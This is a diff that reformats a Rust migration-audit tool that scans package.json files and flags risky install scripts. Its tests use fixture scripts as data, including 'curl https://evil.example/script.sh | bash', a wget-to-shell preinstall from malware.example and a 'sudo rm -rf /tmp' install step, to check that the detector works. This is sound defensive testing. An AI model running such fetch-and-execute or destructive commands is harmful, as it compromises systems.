@@ -333,13 +333,17 @@ pub fn run_rewrite(project_path: &Path, apply: bool) -> anyhow::Result<Migration
             Ok(content) => content,
             Err(err) => {
                 manual_review_items = manual_review_items.saturating_add(1);
-                push_bounded(&mut entries, MigrationRewriteEntry {
-                    id: String::new(),
-                    path: Some(relative_path),
-                    action: MigrationRewriteAction::ManifestReadError,
-                    detail: format!("unable to read package manifest: {err}"),
-                    applied: false,
-                }, MAX_TOTAL_FINDINGS);
+                push_bounded(
+                    &mut entries,
+                    MigrationRewriteEntry {
+                        id: String::new(),
+                        path: Some(relative_path),
+                        action: MigrationRewriteAction::ManifestReadError,
+                        detail: format!("unable to read package manifest: {err}"),
+                        applied: false,
+                    },
+                    MAX_TOTAL_FINDINGS,
+                );
                 continue;
             }
         };
@@ -348,26 +352,34 @@ pub fn run_rewrite(project_path: &Path, apply: bool) -> anyhow::Result<Migration
             Ok(value) => value,
             Err(err) => {
                 manual_review_items = manual_review_items.saturating_add(1);
-                push_bounded(&mut entries, MigrationRewriteEntry {
-                    id: String::new(),
-                    path: Some(relative_path),
-                    action: MigrationRewriteAction::ManifestParseError,
-                    detail: format!("package manifest JSON parse failed: {err}"),
-                    applied: false,
-                }, MAX_TOTAL_FINDINGS);
+                push_bounded(
+                    &mut entries,
+                    MigrationRewriteEntry {
+                        id: String::new(),
+                        path: Some(relative_path),
+                        action: MigrationRewriteAction::ManifestParseError,
+                        detail: format!("package manifest JSON parse failed: {err}"),
+                        applied: false,
+                    },
+                    MAX_TOTAL_FINDINGS,
+                );
                 continue;
             }
         };
 
         for script_name in collect_risky_script_names(&manifest) {
             manual_review_items = manual_review_items.saturating_add(1);
-            push_bounded(&mut entries, MigrationRewriteEntry {
-                id: String::new(),
-                path: Some(relative_path.clone()),
-                action: MigrationRewriteAction::ManualScriptReview,
-                detail: format!("script `{script_name}` requires manual hardening review"),
-                applied: false,
-            }, MAX_TOTAL_FINDINGS);
+            push_bounded(
+                &mut entries,
+                MigrationRewriteEntry {
+                    id: String::new(),
+                    path: Some(relative_path.clone()),
+                    action: MigrationRewriteAction::ManualScriptReview,
+                    detail: format!("script `{script_name}` requires manual hardening review"),
+                    applied: false,
+                },
+                MAX_TOTAL_FINDINGS,
+            );
         }
 
         if ensure_node_engine_pin(&mut manifest) {
@@ -391,31 +403,43 @@ pub fn run_rewrite(project_path: &Path, apply: bool) -> anyhow::Result<Migration
                 rewrites_applied = rewrites_applied.saturating_add(1);
             }
 
-            push_bounded(&mut entries, MigrationRewriteEntry {
-                id: String::new(),
-                path: Some(relative_path.clone()),
-                action: MigrationRewriteAction::PinNodeEngine,
-                detail: "set engines.node to >=20 <23 to reduce migration runtime drift"
-                    .to_string(),
-                applied: apply,
-            }, MAX_TOTAL_FINDINGS);
-            push_bounded(&mut rollback_entries, MigrationRollbackEntry {
-                path: relative_path,
-                original_content: raw,
-                rewritten_content: rewritten,
-            }, MAX_TOTAL_FINDINGS);
+            push_bounded(
+                &mut entries,
+                MigrationRewriteEntry {
+                    id: String::new(),
+                    path: Some(relative_path.clone()),
+                    action: MigrationRewriteAction::PinNodeEngine,
+                    detail: "set engines.node to >=20 <23 to reduce migration runtime drift"
+                        .to_string(),
+                    applied: apply,
+                },
+                MAX_TOTAL_FINDINGS,
+            );
+            push_bounded(
+                &mut rollback_entries,
+                MigrationRollbackEntry {
+                    path: relative_path,
+                    original_content: raw,
+                    rewritten_content: rewritten,
+                },
+                MAX_TOTAL_FINDINGS,
+            );
         }
     }
 
     if package_manifests_scanned == 0 {
         manual_review_items = manual_review_items.saturating_add(1);
-        push_bounded(&mut entries, MigrationRewriteEntry {
-            id: String::new(),
-            path: None,
-            action: MigrationRewriteAction::NoPackageManifest,
-            detail: "no package.json files found; nothing to rewrite".to_string(),
-            applied: false,
-        }, MAX_TOTAL_FINDINGS);
+        push_bounded(
+            &mut entries,
+            MigrationRewriteEntry {
+                id: String::new(),
+                path: None,
+                action: MigrationRewriteAction::NoPackageManifest,
+                detail: "no package.json files found; nothing to rewrite".to_string(),
+                applied: false,
+            },
+            MAX_TOTAL_FINDINGS,
+        );
     }
 
     entries.sort_by(|left, right| {
@@ -713,17 +737,21 @@ fn inspect_package_manifest(
     let parsed: serde_json::Value = match serde_json::from_str(&raw) {
         Ok(value) => value,
         Err(err) => {
-            push_bounded(findings, MigrationAuditFinding {
-                id: String::new(),
-                category: MigrationCategory::Project,
-                severity: MigrationSeverity::High,
-                message: format!("invalid package.json JSON: {err}"),
-                path: Some(relative_path.to_string()),
-                recommendation: Some(
-                    "Fix package.json syntax before running migration rewrite/validate."
-                        .to_string(),
-                ),
-            }, MAX_TOTAL_FINDINGS);
+            push_bounded(
+                findings,
+                MigrationAuditFinding {
+                    id: String::new(),
+                    category: MigrationCategory::Project,
+                    severity: MigrationSeverity::High,
+                    message: format!("invalid package.json JSON: {err}"),
+                    path: Some(relative_path.to_string()),
+                    recommendation: Some(
+                        "Fix package.json syntax before running migration rewrite/validate."
+                            .to_string(),
+                    ),
+                },
+                MAX_TOTAL_FINDINGS,
+            );
             return;
         }
     };
@@ -787,14 +815,18 @@ fn push_capped_script_finding(
         ),
     };
 
-    push_bounded(findings, MigrationAuditFinding {
-        id: String::new(),
-        category,
-        severity,
-        message,
-        path: Some(relative_path.to_string()),
-        recommendation: Some(recommendation),
-    }, MAX_TOTAL_FINDINGS);
+    push_bounded(
+        findings,
+        MigrationAuditFinding {
+            id: String::new(),
+            category,
+            severity,
+            message,
+            path: Some(relative_path.to_string()),
+            recommendation: Some(recommendation),
+        },
+        MAX_TOTAL_FINDINGS,
+    );
 }
 
 fn is_risky_script(script_name: &str, command: &str) -> bool {
@@ -863,26 +895,34 @@ fn append_summary_findings(
     findings: &mut Vec<MigrationAuditFinding>,
 ) {
     if summary.package_manifests == 0 {
-        push_bounded(findings, MigrationAuditFinding {
-            id: String::new(),
-            category: MigrationCategory::Project,
-            severity: MigrationSeverity::High,
-            message: "no package.json files found in target project".to_string(),
-            path: None,
-            recommendation: Some(
-                "Initialize a package manifest before running migrate rewrite/validate."
-                    .to_string(),
-            ),
-        }, MAX_TOTAL_FINDINGS);
+        push_bounded(
+            findings,
+            MigrationAuditFinding {
+                id: String::new(),
+                category: MigrationCategory::Project,
+                severity: MigrationSeverity::High,
+                message: "no package.json files found in target project".to_string(),
+                path: None,
+                recommendation: Some(
+                    "Initialize a package manifest before running migrate rewrite/validate."
+                        .to_string(),
+                ),
+            },
+            MAX_TOTAL_FINDINGS,
+        );
     } else {
-        push_bounded(findings, MigrationAuditFinding {
-            id: String::new(),
-            category: MigrationCategory::Project,
-            severity: MigrationSeverity::Info,
-            message: format!("detected {} package manifest(s)", summary.package_manifests),
-            path: None,
-            recommendation: None,
-        }, MAX_TOTAL_FINDINGS);
+        push_bounded(
+            findings,
+            MigrationAuditFinding {
+                id: String::new(),
+                category: MigrationCategory::Project,
+                severity: MigrationSeverity::Info,
+                message: format!("detected {} package manifest(s)", summary.package_manifests),
+                path: None,
+                recommendation: None,
+            },
+            MAX_TOTAL_FINDINGS,
+        );
     }
 
     if summary.lockfiles.is_empty() {
@@ -898,28 +938,36 @@ fn append_summary_findings(
             ),
         }, MAX_TOTAL_FINDINGS);
     } else {
-        push_bounded(findings, MigrationAuditFinding {
-            id: String::new(),
-            category: MigrationCategory::Dependencies,
-            severity: MigrationSeverity::Info,
-            message: format!("detected {} lockfile(s)", summary.lockfiles.len()),
-            path: None,
-            recommendation: None,
-        }, MAX_TOTAL_FINDINGS);
+        push_bounded(
+            findings,
+            MigrationAuditFinding {
+                id: String::new(),
+                category: MigrationCategory::Dependencies,
+                severity: MigrationSeverity::Info,
+                message: format!("detected {} lockfile(s)", summary.lockfiles.len()),
+                path: None,
+                recommendation: None,
+            },
+            MAX_TOTAL_FINDINGS,
+        );
     }
 
     if summary.js_files == 0 && summary.ts_files == 0 {
-        push_bounded(findings, MigrationAuditFinding {
-            id: String::new(),
-            category: MigrationCategory::Runtime,
-            severity: MigrationSeverity::Low,
-            message: "no JavaScript/TypeScript source files found".to_string(),
-            path: None,
-            recommendation: Some(
-                "Confirm the migration target path points to the intended JS/TS project."
-                    .to_string(),
-            ),
-        }, MAX_TOTAL_FINDINGS);
+        push_bounded(
+            findings,
+            MigrationAuditFinding {
+                id: String::new(),
+                category: MigrationCategory::Runtime,
+                severity: MigrationSeverity::Low,
+                message: "no JavaScript/TypeScript source files found".to_string(),
+                path: None,
+                recommendation: Some(
+                    "Confirm the migration target path points to the intended JS/TS project."
+                        .to_string(),
+                ),
+            },
+            MAX_TOTAL_FINDINGS,
+        );
     } else if summary.js_files > 0 && summary.ts_files == 0 {
         push_bounded(findings, MigrationAuditFinding {
             id: String::new(),
@@ -936,47 +984,60 @@ fn append_summary_findings(
             ),
         }, MAX_TOTAL_FINDINGS);
     } else {
-        push_bounded(findings, MigrationAuditFinding {
-            id: String::new(),
-            category: MigrationCategory::Runtime,
-            severity: MigrationSeverity::Info,
-            message: format!(
-                "found {} JavaScript and {} TypeScript files",
-                summary.js_files, summary.ts_files
-            ),
-            path: None,
-            recommendation: None,
-        }, MAX_TOTAL_FINDINGS);
+        push_bounded(
+            findings,
+            MigrationAuditFinding {
+                id: String::new(),
+                category: MigrationCategory::Runtime,
+                severity: MigrationSeverity::Info,
+                message: format!(
+                    "found {} JavaScript and {} TypeScript files",
+                    summary.js_files, summary.ts_files
+                ),
+                path: None,
+                recommendation: None,
+            },
+            MAX_TOTAL_FINDINGS,
+        );
     }
 
     if summary.risky_scripts > 0 {
-        push_bounded(findings, MigrationAuditFinding {
-            id: String::new(),
-            category: MigrationCategory::Scripts,
-            severity: MigrationSeverity::High,
-            message: format!(
-                "detected {} potentially risky install/build script(s)",
-                summary.risky_scripts
-            ),
-            path: None,
-            recommendation: Some(
-                "Review and harden install/build scripts before enabling strict trust policy."
-                    .to_string(),
-            ),
-        }, MAX_TOTAL_FINDINGS);
+        push_bounded(
+            findings,
+            MigrationAuditFinding {
+                id: String::new(),
+                category: MigrationCategory::Scripts,
+                severity: MigrationSeverity::High,
+                message: format!(
+                    "detected {} potentially risky install/build script(s)",
+                    summary.risky_scripts
+                ),
+                path: None,
+                recommendation: Some(
+                    "Review and harden install/build scripts before enabling strict trust policy."
+                        .to_string(),
+                ),
+            },
+            MAX_TOTAL_FINDINGS,
+        );
     }
 
     if engine_gaps > 0 {
-        push_bounded(findings, MigrationAuditFinding {
-            id: String::new(),
-            category: MigrationCategory::Runtime,
-            severity: MigrationSeverity::Low,
-            message: format!("{} package manifest(s) missing engines.node", engine_gaps),
-            path: None,
-            recommendation: Some(
-                "Pin engines.node across packages to improve migration determinism.".to_string(),
-            ),
-        }, MAX_TOTAL_FINDINGS);
+        push_bounded(
+            findings,
+            MigrationAuditFinding {
+                id: String::new(),
+                category: MigrationCategory::Runtime,
+                severity: MigrationSeverity::Low,
+                message: format!("{} package manifest(s) missing engines.node", engine_gaps),
+                path: None,
+                recommendation: Some(
+                    "Pin engines.node across packages to improve migration determinism."
+                        .to_string(),
+                ),
+            },
+            MAX_TOTAL_FINDINGS,
+        );
     }
 }
 
@@ -1767,8 +1828,11 @@ mod tests {
 
             // Add multiple files at each level to stress the files Vec
             for j in 0..10 {
-                std::fs::write(deep_path.join(format!("file-{:03}.js", j)), "console.log('test');")
-                    .expect("write deep file");
+                std::fs::write(
+                    deep_path.join(format!("file-{:03}.js", j)),
+                    "console.log('test');",
+                )
+                .expect("write deep file");
                 std::fs::write(deep_path.join(format!("file-{:03}.json", j)), "{}")
                     .expect("write deep json");
             }
@@ -1778,7 +1842,10 @@ mod tests {
         let files = collect_project_files(project).expect("collect files");
 
         // Verify files were collected (demonstrating the Vec growth)
-        assert!(files.len() > 1000, "Should collect many files from deep structure");
+        assert!(
+            files.len() > 1000,
+            "Should collect many files from deep structure"
+        );
 
         // All files should be valid paths
         for file_path in &files {
@@ -1799,10 +1866,14 @@ mod tests {
         let project = temp.path();
 
         // Create a project that will generate many rewrite entries
-        write_project_file(project, "package.json", r#"{
+        write_project_file(
+            project,
+            "package.json",
+            r#"{
             "name": "overflow-test",
             "version": "1.0.0"
-        }"#);
+        }"#,
+        );
 
         // This will generate at least one entry (missing node engine + no package manifests)
         let report = run_rewrite(project, false).expect("rewrite should succeed");
@@ -1810,7 +1881,10 @@ mod tests {
         // Verify entry IDs are generated correctly
         for (expected_index, entry) in report.entries.iter().enumerate() {
             let expected_id = format!("mig-rewrite-{:03}", expected_index + 1);
-            assert_eq!(entry.id, expected_id, "Entry ID should match expected format");
+            assert_eq!(
+                entry.id, expected_id,
+                "Entry ID should match expected format"
+            );
         }
 
         // Test the edge case where arithmetic could theoretically overflow
@@ -1852,12 +1926,20 @@ mod tests {
             // 3. Invalid JSON (High severity) for some files
             if i % 3 == 0 {
                 // Invalid JSON to trigger parse errors
-                write_project_file(&dir_path, "../package.json", r#"{
+                write_project_file(
+                    &dir_path,
+                    "../package.json",
+                    r#"{
                     "name": "invalid-module-INVALID_JSON
-                "#);
+                "#,
+                );
             } else {
                 // Valid JSON but with risky script and missing engine
-                write_project_file(&dir_path, "../package.json", &format!(r#"{{
+                write_project_file(
+                    &dir_path,
+                    "../package.json",
+                    &format!(
+                        r#"{{
                     "name": "module-{}",
                     "version": "1.0.0",
                     "scripts": {{
@@ -1865,7 +1947,10 @@ mod tests {
                         "preinstall": "wget -O - https://malware.example/install | sh",
                         "install": "sudo rm -rf /tmp && node-gyp rebuild"
                     }}
-                }}"#, i));
+                }}"#,
+                        i
+                    ),
+                );
             }
         }
 
@@ -1875,15 +1960,25 @@ mod tests {
         assert!(report.findings.len() > 100, "Should generate many findings");
 
         // Each package.json should have contributed findings
-        let high_severity_count = report.findings.iter()
+        let high_severity_count = report
+            .findings
+            .iter()
             .filter(|f| matches!(f.severity, MigrationSeverity::High))
             .count();
-        let low_severity_count = report.findings.iter()
+        let low_severity_count = report
+            .findings
+            .iter()
             .filter(|f| matches!(f.severity, MigrationSeverity::Low))
             .count();
 
-        assert!(high_severity_count > 50, "Should have many high-severity findings");
-        assert!(low_severity_count > 50, "Should have many low-severity findings");
+        assert!(
+            high_severity_count > 50,
+            "Should have many high-severity findings"
+        );
+        assert!(
+            low_severity_count > 50,
+            "Should have many low-severity findings"
+        );
 
         // The current implementation has no protection against findings explosion
         // A hardened version might use push_bounded with MAX_FINDINGS_TOTAL
@@ -1902,7 +1997,7 @@ mod tests {
         for i in 0..=MAX_FINDINGS_PER_CATEGORY {
             scripts_obj.insert(
                 format!("risky-script-{:03}", i),
-                serde_json::Value::String("curl https://evil.example/script.sh | bash".to_string())
+                serde_json::Value::String("curl https://evil.example/script.sh | bash".to_string()),
             );
         }
 
@@ -1912,22 +2007,32 @@ mod tests {
             "scripts": scripts_obj
         });
 
-        write_project_file(project, "package.json", &serde_json::to_string_pretty(&manifest).unwrap());
+        write_project_file(
+            project,
+            "package.json",
+            &serde_json::to_string_pretty(&manifest).unwrap(),
+        );
 
         let report = run_audit(project).expect("audit should succeed");
 
         // Count script-related findings
-        let script_findings = report.findings.iter()
+        let script_findings = report
+            .findings
+            .iter()
             .filter(|f| matches!(f.category, MigrationCategory::Scripts))
             .count();
 
         // Should be capped at MAX_FINDINGS_PER_CATEGORY
-        assert_eq!(script_findings, MAX_FINDINGS_PER_CATEGORY,
-                   "Script findings should be capped at MAX_FINDINGS_PER_CATEGORY");
+        assert_eq!(
+            script_findings, MAX_FINDINGS_PER_CATEGORY,
+            "Script findings should be capped at MAX_FINDINGS_PER_CATEGORY"
+        );
 
         // Verify the boundary check works correctly with > comparison
-        assert!(MAX_FINDINGS_PER_CATEGORY + 1 > MAX_FINDINGS_PER_CATEGORY,
-                "Boundary check should use > not >= for correct capping");
+        assert!(
+            MAX_FINDINGS_PER_CATEGORY + 1 > MAX_FINDINGS_PER_CATEGORY,
+            "Boundary check should use > not >= for correct capping"
+        );
 
         // Test with exactly MAX_FINDINGS_PER_CATEGORY scripts (should all be included)
         let temp2 = tempfile::tempdir().expect("tempdir2");
@@ -1937,7 +2042,7 @@ mod tests {
         for i in 0..MAX_FINDINGS_PER_CATEGORY {
             exact_scripts_obj.insert(
                 format!("risky-script-{:03}", i),
-                serde_json::Value::String("curl https://evil.example/script.sh | bash".to_string())
+                serde_json::Value::String("curl https://evil.example/script.sh | bash".to_string()),
             );
         }
 
@@ -1947,16 +2052,24 @@ mod tests {
             "scripts": exact_scripts_obj
         });
 
-        write_project_file(project2, "package.json", &serde_json::to_string_pretty(&exact_manifest).unwrap());
+        write_project_file(
+            project2,
+            "package.json",
+            &serde_json::to_string_pretty(&exact_manifest).unwrap(),
+        );
 
         let exact_report = run_audit(project2).expect("audit should succeed");
-        let exact_script_findings = exact_report.findings.iter()
+        let exact_script_findings = exact_report
+            .findings
+            .iter()
             .filter(|f| matches!(f.category, MigrationCategory::Scripts))
             .count();
 
         // All MAX_FINDINGS_PER_CATEGORY scripts should be reported
-        assert_eq!(exact_script_findings, MAX_FINDINGS_PER_CATEGORY,
-                   "Exactly MAX_FINDINGS_PER_CATEGORY scripts should all be reported");
+        assert_eq!(
+            exact_script_findings, MAX_FINDINGS_PER_CATEGORY,
+            "Exactly MAX_FINDINGS_PER_CATEGORY scripts should all be reported"
+        );
     }
 
     #[test]
@@ -1972,25 +2085,40 @@ mod tests {
             std::fs::create_dir_all(&module_dir).expect("create module dir");
 
             // Package without node engine - will need rewriting
-            write_project_file(&module_dir, "../package.json", &format!(r#"{{
+            write_project_file(
+                &module_dir,
+                "../package.json",
+                &format!(
+                    r#"{{
                 "name": "module-{}",
                 "version": "1.0.0",
                 "description": "Test module without node engine pin"
-            }}"#, i));
+            }}"#,
+                    i
+                ),
+            );
         }
 
         let report = run_rewrite(project, false).expect("rewrite should succeed");
         let rollback_plan = build_rollback_plan(&report);
 
         // Verify high entry count
-        assert!(rollback_plan.entry_count > 500, "Should have many rollback entries");
-        assert_eq!(rollback_plan.entry_count, rollback_plan.entries.len(),
-                   "Entry count should match entries vector length");
+        assert!(
+            rollback_plan.entry_count > 500,
+            "Should have many rollback entries"
+        );
+        assert_eq!(
+            rollback_plan.entry_count,
+            rollback_plan.entries.len(),
+            "Entry count should match entries vector length"
+        );
 
         // Test potential casting issues
         let entry_count_as_u32 = rollback_plan.entry_count as u32;
-        assert_eq!(entry_count_as_u32 as usize, rollback_plan.entry_count,
-                   "Casting to u32 and back should preserve value for reasonable counts");
+        assert_eq!(
+            entry_count_as_u32 as usize, rollback_plan.entry_count,
+            "Casting to u32 and back should preserve value for reasonable counts"
+        );
 
         // Test with usize values that would overflow u32
         if rollback_plan.entry_count < u32::MAX as usize {
@@ -2005,6 +2133,9 @@ mod tests {
         // Better: let safe_cast = u32::try_from(rollback_plan.entry_count).unwrap_or(u32::MAX);
 
         let safe_cast_demo = u32::try_from(rollback_plan.entry_count).unwrap_or(u32::MAX);
-        assert!(safe_cast_demo > 0, "Safe cast should preserve non-zero values");
+        assert!(
+            safe_cast_demo > 0,
+            "Safe cast should preserve non-zero values"
+        );
     }
 }
